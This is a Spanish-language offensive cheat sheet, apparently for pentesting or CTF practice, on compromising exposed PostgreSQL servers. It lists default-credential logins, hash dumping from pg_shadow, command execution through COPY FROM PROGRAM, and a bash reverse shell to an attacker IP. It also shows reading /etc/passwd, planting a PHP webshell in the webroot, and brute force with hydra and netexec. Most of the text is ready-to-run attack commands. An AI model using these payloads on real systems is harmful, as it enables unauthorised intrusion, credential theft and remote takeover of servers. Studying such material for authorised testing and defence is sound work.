# Base de Datos PostgreSQL

> **Puerto por defecto:** `5432/TCP`

PostgreSQL es una base de datos relacional muy extendida. Expuesta y con credenciales débiles (o por defecto), permite leer datos, **leer/escribir archivos** del sistema y, en versiones recientes, **ejecución de comandos (RCE)** mediante `COPY ... PROGRAM`.

---

## Enumeración

```bash
nmap -p5432 -sCV <IP>
```

### Conexión

```bash
psql -h <IP> -U postgres                 # pide contraseña
psql -h <IP> -U postgres -d <base>
PGPASSWORD='postgres' psql -h <IP> -U postgres
```

Credenciales por defecto habituales: `postgres:postgres`, `postgres:` (vacío), `postgres:admin`.

> **Consejo:** el usuario `postgres` suele ser superusuario. Si entras con él, tienes vía directa a lectura de archivos y, muy probablemente, a RCE con `COPY ... PROGRAM`.

---

## Enumeración dentro de psql

```sql
SELECT version();
\l                      -- listar bases de datos
\c <base>               -- conectarse a una base
\dt                     -- listar tablas
\du                     -- listar roles/usuarios
SELECT * FROM users;    -- buscar credenciales de la app
-- ¿soy superusuario?
SELECT current_setting('is_superuser');
SELECT rolname, rolsuper FROM pg_roles;
```

Volcar los hashes de los propios usuarios de PostgreSQL:

```sql
SELECT usename, passwd FROM pg_shadow;
```

---

## RCE con COPY ... PROGRAM (superusuario)

Si eres superusuario (PostgreSQL ≥ 9.3), ejecutas comandos del sistema directamente:

```sql
-- Ejecutar un comando y recoger su salida en una tabla
CREATE TABLE cmd_out(line text);
COPY cmd_out FROM PROGRAM 'id';
SELECT * FROM cmd_out;
```

Reverse shell:

```sql
COPY cmd_out FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<TU_IP>/443 0>&1"';
```

> **Nota:** `metasploit` tiene `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` que automatiza esto. Pero a mano es trivial y funciona casi siempre que seas superusuario.

---

## Lectura y escritura de archivos

```sql
-- Leer un archivo del sistema
CREATE TABLE f(content text);
COPY f FROM '/etc/passwd';
SELECT * FROM f;

-- Escribir un archivo (p.ej. una webshell si conoces el webroot)
COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/sh.php';
```

---

## Fuerza bruta

```bash
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt postgres://<IP>
netexec postgres <IP> -u postgres -p passwords.txt
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `psql` | Cliente oficial de PostgreSQL. |
| `netexec postgres` | Enumeración y validación de credenciales. |
| `metasploit` (postgres_*) | Módulos de login, lectura de archivos y RCE. |
| `hydra` | Fuerza bruta. |

---

> **Consejo:** ante un PostgreSQL, prueba `postgres` con contraseñas triviales, comprueba si eres superusuario (`is_superuser`), y si lo eres, ve directo a `COPY ... FROM PROGRAM` para RCE. Si no, vuelca las tablas de la aplicación (sus hashes/credenciales se reutilizan en otros servicios).
